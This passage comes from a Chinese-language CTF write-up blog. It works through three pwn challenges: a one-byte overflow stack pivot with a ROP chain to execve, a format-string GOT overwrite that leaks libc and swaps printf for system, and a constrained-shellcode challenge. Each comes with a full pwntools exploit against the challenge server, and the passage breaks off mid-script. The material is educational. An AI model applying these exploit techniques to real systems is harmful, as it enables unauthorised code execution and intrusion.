class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">9</span>]; <span class="comment">// [rsp+2h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> length; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;how much do you have to say?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">9uLL</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  length = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> (length &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not much to say.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (length &lt;= <span class="number">257</span> )</span><br><span class="line">    <span class="keyword">return</span> overflow(length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s too much to say!.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于对 length 限制了上限于下限，所以 257 这个数字是不能绕过的，因此我们只能利用那溢出的一个字节来修改 esp。这道题的思路就是利用溢出的一字节将栈抬升到我们的输入出，控制了栈顶以后就控制了 ret，之后再利用 rop 执行系统调用即可。</p><p>在 sub_400BD2 中，由于<code>return overflow(length);</code>，因此汇编代码中将会出现两次连续的 leave 和 ret</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">leave</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>首先第一次 leave 将栈中被我们修改了的 old rbp 弹出到 rbp 中，这时 rbp 被我们控制，rbp 将会被抬高（即栈底在栈顶的上面），执行完第一个 ret 以后又是一个 leave，首先 <code>mov rsp rbp</code> 将被我们修改了的 rbp 移动到 rsp 中，这时我们就控制了栈顶，之后执行 ret 指令就可以弹出站上的一个地址并且跳转到地址去执行指令，可以形成 rop。</p><p>我们一共最多可以输入 256 个字节，但是由于 ASLR，所以我们并不能知道将栈抬升到那里才刚好可以执行 rop，所以可以在栈上先填充类似 nop 指令到 ret 指令，填充的越多命中的相对概率越大，只要命中了一条 ret，就可以一直 <code>pop rip</code> 到 rop 开始的地方。</p><p>exp 如下，可能需要多尝试几次才行，由于开启了 ASLR，所以每次栈的位置不固定，可以尝试修改 <code>\x00</code> 将 esp 移动到合适的地方，取值范围<code>[0x00, 0xf8]</code>，必须是 8 的倍数，不过还是得看脸才能命中 ret，最后拿到 flag<code>ctf&#123;yeT_thls_ls_4nOTHer_sH3Ilcod3_ch4!!3ng3&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19903</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">ROP Gadgets:</span></span><br><span class="line"><span class="string">    0x0000000000400416 : ret</span></span><br><span class="line"><span class="string">    0x0000000000415f04 : pop rax ; ret</span></span><br><span class="line"><span class="string">    0x0000000000400686 : pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000410a93 : pop rsi ; ret</span></span><br><span class="line"><span class="string">    0x000000000044a155 : pop rdx ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .text:00000000004498E5                 syscall                 ; LINUX - sys_alarm</span></span><br><span class="line"><span class="string">    .text:00000000004498E7                 cmp     rax, 0FFFFFFFFFFFFF001h</span></span><br><span class="line"><span class="string">    .text:00000000004498ED                 jnb     short loc_4498F0</span></span><br><span class="line"><span class="string">    .text:00000000004498EF                 retn</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000415f04</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400686</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000410a93</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000044a155</span></span><br><span class="line">syscall = <span class="number">0x00000000004498E5</span></span><br><span class="line">bss_buf = <span class="number">0x6BB300</span></span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;how much do you have to say?\n&#x27;</span>, <span class="string">&#x27;257&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = pg.get(256)+&#x27;\x80&#x27;</span></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0x0</span>,  <span class="comment"># read syscall</span></span><br><span class="line">    pop_rdi_ret, <span class="number">0x0</span>, pop_rsi_ret, bss_buf, pop_rdx_ret, <span class="number">0x8</span>, syscall,</span><br><span class="line">    pop_rax_ret, <span class="number">0x3b</span>, <span class="comment"># execve syscall</span></span><br><span class="line">    pop_rdi_ret, bss_buf, pop_rsi_ret, <span class="number">0x0</span>, pop_rdx_ret, <span class="number">0x0</span>, syscall</span><br><span class="line">], word_size=<span class="number">64</span>)</span><br><span class="line">payload = (p64(ret) * ((<span class="number">256</span> - <span class="built_in">len</span>(payload))/<span class="number">8</span>)) + payload + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) == <span class="number">257</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">conn.sendafter(<span class="string">&#x27;Ok, what do you have to say for yourself?\n&#x27;</span>, payload+<span class="string">&#x27;//bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="pwnepsilon-200"><a href="#pwnepsilon-200" class="headerlink" title="pwnepsilon(200)"></a>pwnepsilon(200)</h1><p>题目的源码非常简单，buf 长度为 1032，读入 1024 字节，相差 8 字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_40069D</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you mean this time? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Interesting &quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; food for thought&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到直接有 <code>  printf(buf);</code>，所以存在一个格式化字符串漏洞，我们最终的目的就是劫持 got 表，将 got 表中的 printf 函数修改为 system，不过首先我们需要能够让程序多次执行<code>  printf(buf)</code> 才可以多次触发 payload。</p><p>因为每次 printf 之后都会调用一次 puts 函数，所以我们可以将 puts 函数在 got 表中的值修改为 sub_40069D 的地址，这样每次调用 puts 函数就可以重新进入 sub_40069D 执行<code>printf(buf)</code>，再通过 pwndbg 的 fmtarg 确定参数偏移为 6 以后就可以使用 pwntools 的 fmtstr_payload 生成任意写的 payload 了。需要注意的是 64 位系统中 printf 函数的前六个参数会存储在寄存器中，除去第一个参数作为格式化字符串以外，后面五个参数会存放在寄存器中，第六个参数才会从栈中获取，这就是为什么虽然我们输入的 payload 在栈顶，但是 fmtarg 计算出的偏移却是 6。</p><p>由于题目中没有给 libc，所以下一步的目标就是泄漏一个 got 函数的地址，由于我们已经将 puts 的 got 地址修改为 sub_40069D，所以这次泄漏 read 函数，payload 为<code>&#39;&#123;&#123;%7$s&#125;&#125;&#39; + p64(elf.got[&#39;read&#39;])</code>。</p><p>拿到 libc 以后就可以计算出 system 函数的地址，之后再将 printf 在 got 表中的地址修改为 system 函数的地址即可，这样每次调用 printf 函数就相当于调用 system 函数。</p><p>最终的 exp 如下，最后拿到 flag<code>ctf&#123;fOrmat_s7rIng_vu!_stop_uslng_17&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19904</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">payload</span>):</span><br><span class="line">    conn.sendafter(<span class="string">&#x27;What do you mean this time? &#x27;</span>, payload)</span><br><span class="line">    pwn(fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;puts&#x27;</span>]: <span class="number">0x40069D</span>&#125;))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">r&#x27;&#123;&#123;%7$s&#125;&#125;&#x27;</span> + p64(elf.got[<span class="string">&#x27;read&#x27;</span>]))</span><br><span class="line">conn.recvuntil(<span class="string">r&#x27;&#123;&#123;&#x27;</span>)</span><br><span class="line">read_addr = u64(conn.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;read address: &#x27;</span> + <span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">got_addr = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr = got_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system address: &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">pwn(fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: system_addr&#125;))</span><br><span class="line">conn.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwnzeta-200"><a href="#pwnzeta-200" class="headerlink" title="pwnzeta(200)"></a>pwnzeta(200)</h1><p>这题和 pwngamma 很像，只能输入 26 字节的 shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">get_that_shellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">26</span>]; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send me your ride&quot;</span>);</span><br><span class="line">  v0 = read(<span class="number">0</span>, buf, <span class="number">26uLL</span>);</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (v0 == <span class="number">26</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(buf) == <span class="number">26</span> )</span><br><span class="line">      shellcode_it(buf, <span class="number">26LL</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re not up to code.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You ain&#x27;t ready.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看 shellcode_it</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">shellcode_it</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// ST78_8</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ST50_4 OVERLAPPED</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// ST54_1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ST56_4 OVERLAPPED</span></span><br><span class="line">  __int64 v5; <span class="comment">// ST5B_8 OVERLAPPED</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// ST63_1</span></span><br><span class="line">  __int128 v7; <span class="comment">// ST65_16 OVERLAPPED</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// ST55_1</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// ST5A_1</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// ST64_1</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// ST20_8</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// ST28_8</span></span><br><span class="line">  <span class="type">char</span> *v13; <span class="comment">// ST30_8</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// ST38_8</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// ST40_8</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// ST48_8</span></span><br><span class="line">  <span class="type">char</span> *v17; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = *a1;</span><br><span class="line">  v3 = a1[<span class="number">4</span>];</span><br><span class="line">  v4 = *(a1 + <span class="number">5</span>);</span><br><span class="line">  v5 = *(a1 + <span class="number">9</span>);</span><br><span class="line">  v6 = a1[<span class="number">17</span>];</span><br><span class="line">  *&amp;v7 = *(a1 + <span class="number">18</span>);</span><br><span class="line">  v8 = <span class="number">0xCC</span>u;</span><br><span class="line">  v9 = <span class="number">0xCC</span>u;</span><br><span class="line">  v10 = <span class="number">0xCC</span>u;</span><br><span class="line">  BYTE8(v7) = <span class="number">0xCC</span>u;</span><br><span class="line">  v11 = clean;</span><br><span class="line">  v12 = qword_202028;</span><br><span class="line">  v13 = qword_202030;</span><br><span class="line">  v14 = qword_202038;</span><br><span class="line">  v15 = qword_202040;</span><br><span class="line">  v16 = qword_202048;</span><br><span class="line">  v17 = mmap(<span class="number">0LL</span>, <span class="number">78uLL</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  *v17 = v11;</span><br><span class="line">  *(v17 + <span class="number">1</span>) = v12;</span><br><span class="line">  *(v17 + <span class="number">2</span>) = v13;</span><br><span class="line">  *(v17 + <span class="number">3</span>) = v14;</span><br><span class="line">  *(v17 + <span class="number">4</span>) = v15;</span><br><span class="line">  *(v17 + <span class="number">5</span>) = v16;</span><br><span class="line">  *(v17 + <span class="number">6</span>) = *&amp;v2;</span><br><span class="line">  *(v17 + <span class="number">7</span>) = *(&amp;v4 + <span class="number">2</span>);</span><br><span class="line">  *(v17 + <span class="number">8</span>) = *(&amp;v5 + <span class="number">5</span>);</span><br><span class="line">  *(v17 + <span class="number">18</span>) = *(&amp;v7 + <span class="number">3</span>);</span><br><span class="line">  *(v17 + <span class="number">38</span>) = *(&amp;v7 + <span class="number">7</span>);</span><br><span class="line">  (v17)(<span class="number">0LL</span>, <span class="number">78LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要逻辑就是申请一块可执行的匿名内存，将我们输入的 shellcode 拼接到一段内置的 shellcode<code>\x48\x31\xED\x48\x31\xE4\x48\x31\xC0\x48\x31\xDB\x48\x31\xC9\x48\x31\xD2\x48\x31\xF6\x48\x31\xFF\x4D\x31\xC0\x4D\x31\xC9\x4D\x31\xD2\x4D\x31\xDB\x4D\x31\xE4\x4D\x31\xED\x4D\x31\xF6\x4D\x31\xFF</code>后面，这段 shellcode 翻译成汇编为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">xor    rbp,rbp</span><br><span class="line">xor    rsp,rsp</span><br><span class="line">xor    rax,rax</span><br><span class="line">xor    rbx,rbx</span><br><span class="line">xor    rcx,rcx</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdi,rdi</span><br><span class="line">xor    r8,r8</span><br><span class="line">xor    r9,r9</span><br><span class="line">xor    r10,r10</span><br><span class="line">xor    r11,r11</span><br><span class="line">xor    r12,r12</span><br><span class="line">xor    r13,r13</span><br><span class="line">xor    r14,r14</span><br><span class="line">xor    r15,r15</span><br></pre></td></tr></table></figure><p>其作用就是将所有的寄存器清零，这其中包括了 rsp 和 rbp，所以我们用不了栈。不过也有一个好处就是我们 shellcode 中不需要再将某些寄存器清零了，这就避免了坏字符的出现。之后会将我们提供的 shellcode 分别在第 5，第 10，第 20，第 29 个字节前插入 0xcc，也就是 int3 中断，所以我们的 shellcode 会被分成 4 段，每段长度为 5，4，9，8，而为了避免 int3 的干扰，我们可以在 0xcc 前添加 0xb2 将 0xcc 吞掉，0xb2cc 的汇编为<code>mov dl, 0xcc</code>，因此每段的长度就变成了 4，3，8，7。</p><p>最后的目的就是通过 syscall 系统调用执行命令，但是首先必须找到一块可写并且可读的内存来存放字符串<code>/bin/sh</code>，由于所有的寄存器都清零了，所以我们可以利用的内存就只有存放我们 shellcode 的那段新申请的内存，所以我们就需要想办法拿到那段内存中某一个地址。</p><p>当所有寄存器都为 0 时调用 syscall，此时相当于<code>read(0, NULL, 0)</code>，执行完成后 rcx 的内容会变成下一个下一条指令的地址，利用这一点我们就可以拿到这段内存中的地址。</p><p>直接在 shellcode 中调用 execve 的 syscall 是无法起作用的，shellcode 中不能出现 0x0，所以被写入内存的字符串 <code>/bin/sh</code> 会与后面的字符串相连，经过测试在最后添加分号也没有办法执行，所以可以换一种思路，调用 read 的系统调用，然后将新的不受限制的 shellcode 写入这段内存中，之后再 jmp 到 shellcode 处即可，所以第一个 shellcode 为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">; First segment, 4 bytes.</span><br><span class="line">syscall</span><br><span class="line">nop</span><br><span class="line">nop</span><br><span class="line"></span><br><span class="line">; Second segment, 3 bytes.</span><br><span class="line">mov rsi, rcx</span><br><span class="line"></span><br><span class="line">; Third segment, 8 bytes.</span><br><span class="line">sub rsi, 0x32</span><br><span class="line">mov dl, 0x20</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">; Last segment.</span><br><span class="line">jmp rsi</span><br></pre></td></tr></table></figure><p>这里的 <code>sub rsi, 0x32</code> 可以得到这段内存起始地址，分别用 0xb2 将每段 shellcode 连起来，再发送新的 shellcode，由于前面的 shellcode 中的 <code>mov dl, 0xcc</code> 会改变 rdx 的值，所以这里需要手动将 rdx 清零，另外字符串 <code>/bin/sh\x00</code> 在这段 shellcode 的最后发送，所以需要 <code>add rdi, 0x11</code> 跳转到 syscall 的后面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov al, 0x3b</span><br><span class="line">mov rdi, rsi</span><br><span class="line">add rdi, 0x11</span><br><span class="line">xor rsi, rsi</span><br><span class="line">xor rdx, rdx</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>最终的 exp 如下，拿到 flag 为<code>ctf&#123;ar3_y0u_sHelic0de_m4sT3r&#125;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">    HOST = <span class="string">&#x27;vps1.blue-whale.me&#x27;</span></span><br><span class="line">PORT = <span class="number">19905</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;) </span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = 